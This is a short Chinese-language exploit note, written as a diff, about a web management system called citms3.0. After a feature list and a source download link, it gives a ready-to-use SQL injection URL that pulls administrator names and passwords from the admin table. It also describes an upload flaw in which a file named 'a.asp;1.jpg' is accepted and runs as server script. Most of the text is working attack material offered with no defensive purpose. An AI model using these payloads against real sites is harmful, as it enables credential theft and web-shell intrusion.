@@ -1,0 +1,18 @@
+管理系统部分功能如下：
+（１）在线增加、修改、删除管理员
+（２）在线增加、修改、删除客户记录、支持HTML等..
+（３）前台记录有追踪功能．．以及追踪记录和点击次数显示
+
+源码下载：
+http://www.mycodes.net/30/5238.htm 
+
+注入：
+http://www.shitsec.com/citms3.0/list.asp?id=1320 union select 1,name,3,pass,5,6,7,8,9,10,11,12,13,14,15,16 from admin
+
+上传
+http://www.shitsec.com/soft/demo/citms3.0/upload_pic.asp
+
+上传a.asp;1.jpg 成功后得到：a.asp;随机数.jpg
+
+如：http://www.shitsec.com/a.asp;131672.jpg
+
